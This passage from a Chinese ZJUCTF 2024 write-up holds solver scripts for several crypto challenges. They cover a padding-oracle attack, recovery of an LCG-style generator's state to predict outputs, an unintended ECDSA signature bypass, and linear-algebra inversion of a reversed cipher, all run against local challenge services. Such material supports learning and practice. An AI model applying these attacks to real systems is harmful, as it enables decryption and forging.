class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,j-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>                    temp[z] = hexstr(<span class="hljs-built_in">int</span>(temp[z],<span class="hljs-number">16</span>)^(<span class="hljs-number">16</span>-j)^(<span class="hljs-number">17</span>-j))<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> ans<br><br>msg1 = part(E1,IV)<br>msg2 = part(E2,E1)<br>message = msg1+msg2<br><span class="hljs-built_in">print</span>(message)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>io.recv()<br>io.sendline(message)<br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/2.png"></li></ul><h2 id="pseudo">pseudo</h2><ul><li>关键随机数生成逻辑： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-variable language_">self</span>.K = (<span class="hljs-variable language_">self</span>.a * <span class="hljs-variable language_">self</span>.K + <span class="hljs-variable language_">self</span>.b) % <span class="hljs-variable language_">self</span>.c<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.K // <span class="hljs-variable language_">self</span>.d<br></code></pre></td></tr></table></figure></li><li>懒得写latex公式了，于是手写了一份wp解题思路: <img src="/img/zjuctf2024/10.png"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>a = <span class="hljs-number">0x5680951767695824a313b0f7334bc38478cb4b9c572605476afcd28ac7ebd331ce5eb1</span><br>b = <span class="hljs-number">0x79f17055ba11954ffcae4bbd107fa270f789109a6df0295061a0547888719196</span><br>c = <span class="hljs-number">0x160f8d6811c8f089d7ee35b9d1ed4b2f445a712bf654f93fcb4dc7bb619186f91a79d87b8a54749ca8869a6984e314a1aa8d5bfe7019da406823c69d958b6ae6</span><br>d = <span class="hljs-number">0xc406ce580f97fe41b5b49b0d54044e23d2b3fe844c9d4bba68b444d2e8abc71d</span><br>R0 = <span class="hljs-number">0xf9ad0aaac650a41906294c3dc0044050f7522d055b512a95836ad36225076a5</span><br>R1 = <span class="hljs-number">0x10a69f08a8c3a7f0ffc5e73f5aa94737a62b389a9256e4705261bd23a22cd4f9</span><br><br><span class="hljs-comment"># t = 36438581768728120251810633059169809446924506563640328377786754579743452784368</span><br><span class="hljs-comment"># K1 = R0*d+t</span><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># print((a*t)//c)</span><br><span class="hljs-built_in">print</span>((a*d*R0+b)%c)<br><span class="hljs-built_in">print</span>((R1*d-(a*d*R0+b))%c)<br><span class="hljs-comment"># print(((a*K1+b)%c)//d==R1)</span><br><br>p = (R1*d-(a*d*R0+b))%c<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">t,r</span>):<br>    <span class="hljs-keyword">return</span> (a*t+b+R0*d*a)%c == R1*d+r<br><br>k = <span class="hljs-number">0</span><br>bitlength = <span class="hljs-number">2</span>**<span class="hljs-number">256</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    q = c*k + p<br>    t = q//a+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> t &gt; bitlength:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        r = a*t-q<br>        <span class="hljs-keyword">if</span> r &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> r &gt; d:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> test(t,r):<br>                <span class="hljs-built_in">print</span>([t,r,k])<br>        t += <span class="hljs-number">1</span><br>    k += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li>用这个解题思路写出脚本然后交互，多组解用sha来判断唯一性: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> i2b<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">59789</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>)<br>a   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">3</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>b   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>c   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>d   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>io.recvline()<br>R0  = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>R1  = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>sha = io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;sha256(R)[:16] = &quot;</span>):-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(sha)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(sha)==<span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(a,b,c,d,R0,R1,sha)<br>p = (R1*d-(a*d*R0+b))%c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">t,r</span>):<br>    <span class="hljs-keyword">return</span> (a*t+b+R0*d*a)%c == R1*d+r<br><br>k = <span class="hljs-number">0</span><br>bitlength = <span class="hljs-number">2</span>**<span class="hljs-number">256</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    guess = []<br>    q = c*k + p<br>    t = q//a+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> t &gt; bitlength:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        r = a*t-q<br>        <span class="hljs-keyword">if</span> r &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> r &gt; d:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> test(t,r):<br>                <span class="hljs-built_in">print</span>([t,r,k])<br>                K = R0*d+t<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                    guess.append(K//d)<br>                    K = (K*a+b)%c<br>                digest = sha256(reduce(<span class="hljs-keyword">lambda</span> x, y: x + i2b(y), guess, <span class="hljs-string">b&quot;&quot;</span>)).hexdigest()<br>                <span class="hljs-keyword">if</span> digest[:<span class="hljs-number">16</span>]==sha:<br>                    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                        io.recv()<br>                        io.sendline(<span class="hljs-built_in">hex</span>(guess[j]))<br>                    io.interactive()<br>        t += <span class="hljs-number">1</span><br>    k += <span class="hljs-number">1</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/11.png"></li></ul><h2 id="shadowtime">shadowtime</h2><ul><li>仔细看了看源码，发现把sign得到的签名去verify就能过检测?应该是非预期解，本来就不怎么会椭圆曲线数字签名，这下好了() <img src="/img/zjuctf2024/16.png"></li></ul><h2 id="line">line</h2><ul><li>只是一个程序，感觉有点算rev的题目，放到ida逆向，发现是对flag和key做了处理后得到的东西与cip内的值进行比较: <img src="/img/zjuctf2024/17.png"></li><li>flag只有16个字符，key只有8个字符，而最后的结果也只有16个字符，其中flag的<code>ZJUCTF&#123;&#125;</code>我是知道的，那么就是16个字符未知，结果16个字符已知；如果我们把加密过程看作一个矩阵(192*128)，构造输入求出矩阵值，再根据结果求解输入即可(要求是加密过程线性并且矩阵满秩)，选择恰当的行使得矩阵满秩；</li><li>我先逆向了加密过程（但是后来发现根本不用逆向，因为程序把加密后的结果输出出来了！man！费我2小时），然后构造矩阵，对ans进行处理减去已知字节行，发现秩是110，但是这时还是128的输入，sage库无法解非满秩方程，于是就得爆破线性相关的18组对应的值，对每个可能解方程，看结果是否符合flag：</li><li>减去已知行求秩： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> copy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">flaglis,keylis</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):    <span class="hljs-comment">#len(flaglis)</span><br>        flaglis[i] ^= keylis[i&amp;<span class="hljs-number">7</span>]<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">what</span>(<span class="hljs-params">a,b</span>):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> b&amp;<span class="hljs-number">1</span>!=<span class="hljs-number">0</span>:<br>            tmp^=a<br>        a = (a*<span class="hljs-number">2</span>)%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">if</span> a&gt;=<span class="hljs-number">2</span>**<span class="hljs-number">7</span>:<br>            a^=<span class="hljs-number">0x1b</span><br>        b = b&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> tmp<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alpha</span>(<span class="hljs-params">flagpiece,index</span>):<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> i&gt;=index:<br>            <span class="hljs-keyword">break</span><br>        flagpiece = flagpiece[<span class="hljs-number">1</span>:]+flagpiece[:<span class="hljs-number">1</span>]<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> flagpiece<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">beta</span>(<span class="hljs-params">tmp</span>):<br>    newflagpiece = [<span class="hljs-number">0</span>]*<span class="hljs-number">4</span><br>    newflagpiece[<span class="hljs-number">0</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">1</span>)<br>    newflagpiece[<span class="hljs-number">1</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">1</span>)<br>    newflagpiece[<span class="hljs-number">2</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">3</span>)<br>    newflagpiece[<span class="hljs-number">3</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> newflagpiece<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magicspell1</span>(<span class="hljs-params">flaglis</span>):<br>    <span class="hljs-comment"># print(flaglis)</span><br>    newflaglis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        newflaglis.extend(alpha(flaglis[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>],i))<br>    <span class="hljs-keyword">return</span> newflaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magicspell2</span>(<span class="hljs-params">flaglis</span>):<br>    flagpiece = [<span class="hljs-number">0</span>]*<span class="hljs-number">4</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            flagpiece[j] = flaglis[<span class="hljs-number">4</span>*j+i]<br>        res = beta(flagpiece)<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            flaglis[<span class="hljs-number">4</span>*k+i] = res[k]<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">flaglis,keylis,times=<span class="hljs-number">0xaaa</span></span>):<br>    flaglis = add(flaglis,keylis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,times):<br>        flaglis = magicspell1(flaglis)<br>        flaglis = magicspell2(flaglis)<br>    flaglis = magicspell1(flaglis)<br>    flaglis = add(flaglis,keylis)<br>    <span class="hljs-keyword">return</span> flaglis<br><br>length = (<span class="hljs-number">16</span>+<span class="hljs-number">8</span>)*<span class="hljs-number">8</span><br>anslength = <span class="hljs-number">128</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">key</span>):<br>    <span class="hljs-keyword">global</span> check<br>    inputs = [<span class="hljs-string">&#x27;0&#x27;</span>]*length<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        inputs[i]=<span class="hljs-built_in">str</span>(key%<span class="hljs-number">2</span>)<br>        key = key&gt;&gt;<span class="hljs-number">1</span><br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,length,<span class="hljs-number">8</span>):<br>        tmp.append(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(inputs[i:i+<span class="hljs-number">8</span>]),<span class="hljs-number">2</span>))<br>    flaglis = tmp[:<span class="hljs-number">16</span>]<br>    keylis = tmp[<span class="hljs-number">16</span>:]<br>    res = magic(flaglis,keylis)<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mykey</span>():<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;(length):<br>        key = <span class="hljs-number">1</span>&lt;&lt;(length-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">yield</span> generate(key)<br>        i+=<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getRow</span>():<br>    temp = mykey()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        s = <span class="hljs-built_in">next</span>(temp)<br>        row = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> s <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> t])<br>        <span class="hljs-keyword">yield</span> row<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildBox</span>():<br>    box = matrix(GF(<span class="hljs-number">2</span>),length,anslength)<br>    rg = getRow()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(length)):<br>        box[i] = <span class="hljs-built_in">next</span>(rg)<br>    <span class="hljs-keyword">return</span> box<br><br><span class="hljs-comment"># b_192_128 = buildBox()</span><br><span class="hljs-comment"># with open(&#x27;box.txt&#x27;,&#x27;w&#x27;) as f:</span><br><span class="hljs-comment">#     f.write(str(b_192_128))</span><br>b_192_128 = matrix(GF(<span class="hljs-number">2</span>),length,anslength)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;box.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    rowcnt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        b_192_128[i] = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> f.readline().strip().replace(<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).split(<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> t])<br><br>testflag = <span class="hljs-string">&quot;ZJUCTF&#123;11451419&#125;&quot;</span><br>testkey = <span class="hljs-string">&quot;hahahaha&quot;</span><br>ans = magic([<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag],[<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testkey])<br><span class="hljs-built_in">print</span>(ans)<br>b_flag = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag+testkey] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br>leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br><span class="hljs-keyword">assert</span> b_flag*b_192_128==leak<br><br>knownindex = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>*<span class="hljs-number">8</span>,<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)]<br>known = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZJUCTF&#123;********&#125;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>b_128_128 = matrix(GF(<span class="hljs-number">2</span>),length-<span class="hljs-built_in">len</span>(knownindex),anslength)<br>test = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag[<span class="hljs-number">7</span>:<span class="hljs-number">15</span>]+testkey])<br>new_flag = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> test])<br>newleak = leak<br>b_index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> knownindex:<br>        b_128_128[b_index] = b_192_128[i]<br>        b_index+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            newleak[j] = newleak[j]+known[i]*b_192_128[i,j]<br><span class="hljs-keyword">assert</span> new_flag*b_128_128==newleak<br><span class="hljs-built_in">print</span>(b_128_128.rank())  <span class="hljs-comment">#110</span><br></code></pre></td></tr></table></figure></li><li>选取恰当的爆破行使得矩阵的秩不变: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">b = b_128_128.transpose()<br>echelon_b = b.echelon_form()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;阶梯形矩阵:&quot;</span>)<br><span class="hljs-built_in">print</span>(echelon_b)<br><br>choices = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    choices.append([])<br><br>rows, cols = echelon_b.nrows(), echelon_b.ncols()<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cols):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rows-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> echelon_b[i, j] == <span class="hljs-number">1</span>:<br>            choices[i].append(j)<br>            <span class="hljs-keyword">break</span> <br><span class="hljs-built_in">print</span>(choices)<br><br>b_110_128 = matrix(GF(<span class="hljs-number">2</span>),<span class="hljs-number">110</span>,anslength)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>):<br>    b_110_128[i] = b_128_128[i]<br>b_110_128[<span class="hljs-number">80</span>] = b_128_128[<span class="hljs-number">110</span>]<br>b_110_128[<span class="hljs-number">88</span>] = b_128_128[<span class="hljs-number">111</span>]<br><span class="hljs-built_in">print</span>(b_110_128.rank())<br></code></pre></td></tr></table></figure></li><li>爆破对应行的值，输出结果: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 